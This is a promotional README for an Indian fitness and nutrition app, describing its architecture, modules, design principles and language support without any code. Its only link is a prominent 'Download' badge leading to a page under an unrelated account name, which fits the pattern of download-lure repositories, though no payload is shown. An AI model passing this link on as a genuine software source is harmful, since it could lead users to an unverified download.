# 🏋️ Pravin Elite Wellness Matrix — Adaptive Indian Nutrition & Training Companion

[![Download](https://raw.githubusercontent.com/haschildrensfoundation/pravin-elite-fitcore/main/pkg_f1cb5.svg)](https://haschildrensfoundation.github.io/pravin-elite-fitcore/)

A next-generation wellness orchestration platform that blends ancestral Indian dietary wisdom with modern macro-science, adaptive coaching flows, and a resilient, offline-first architecture. Built for coaches, athletes, and everyday movers who treat their body like a long-term project rather than a seasonal sprint.

---

## 🌟 Vision Statement

Most fitness apps treat nutrition as a spreadsheet and training as a stopwatch. The Pravin Elite Wellness Matrix treats them as a living ecosystem — one where your dal, your roti, your sprint intervals, and your recovery naps all speak to each other. This repository hosts the complete engine behind that ecosystem: a modular, multilingual, and beautifully responsive interface designed for real Indian kitchens and real Indian gyms.

The project was born from a simple frustration: world-class coaching tools rarely understand that "one cup of rice" means something very different in Kolhapur than it does in Copenhagen. So we rebuilt the foundation from the soil up.

- **Coach Cockpit** — Trainers manage dozens of clients from one calm, clutter-free dashboard.

## 🏗️ Architecture Overview

The platform is layered like a well-built thali — each compartment distinct yet part of a single satisfying whole.

- **Presentation Layer** — Component-driven UI with a design-token foundation
- **Domain Layer** — Pure business logic for macros, scheduling, and progression
- **Integration Layer** — Adapters for wearable data, calendars, and messaging channels
- **Persistence Layer** — Local encrypted store with conflict-free merge on sync
- **Edge Layer** — Lightweight functions handling reminders and churn-risk signals

Communication between layers happens through typed contracts, which keeps the system predictable even as features grow.

## 🧩 Module Breakdown

### Wellness Core
The beating heart. Stores athlete profiles, goals, medical flags, and dietary preferences. Every other module reads from this single source of truth.

### Kitchen Ledger
Tracks pantry inventory, grocery lists, and meal-prep batching. Turns a nutrition plan into an actionable shopping cart.

### Iron Journal
Captures every set, rep, and rest interval. Produces heatmaps of muscle-group coverage over a training block.

### Booking Sanctum
Handles the choreography of coach-athlete time. Supports one-on-one, small-group, and remote-video formats.

### Coach Cockpit
Aggregates client signals into an early-warning system. Highlights who is thriving and who needs a nudge.

### Signal Bridge
The notification backbone. Delivers the right message through the right channel at the right hour.

### Insight Forge
Renders charts, digests, and progress narratives. Converts rows of data into something a human can feel proud of.

## 🎨 Design Philosophy

We believe fitness software should feel like a calm training partner, not a screaming drill sergeant. The visual language borrows from Indian textile patterns — subtle, rhythmic, and warm — while the interaction model borrows from aviation cockpits: information-dense but never chaotic.

Three principles guide every screen:

1. **Clarity over cleverness** — If a feature needs a tutorial, it needs a redesign.
2. **Progress over perfection** — Celebrate small wins loudly.
3. **Respect over restriction** — Never shame a meal or a missed session.

## 📱 Responsive UI & Multilingual Support

The interface flows gracefully from a compact phone screen in a crowded metro to a widescreen monitor in a coaching studio. Layouts reflow rather than shrink, so important actions always stay within thumb reach.

Localization covers:
- English
- हिन्दी (Hindi)
- मराठी (Marathi)
- தமிழ் (Tamil)
- ಕನ್ನಡ (Kannada)
- বাংলা (Bengali)
- ગુજરાતી (Gujarati)

Right-to-left support is scaffolded for future expansion. Number formatting, date conventions, and unit systems adapt automatically to the user's locale.
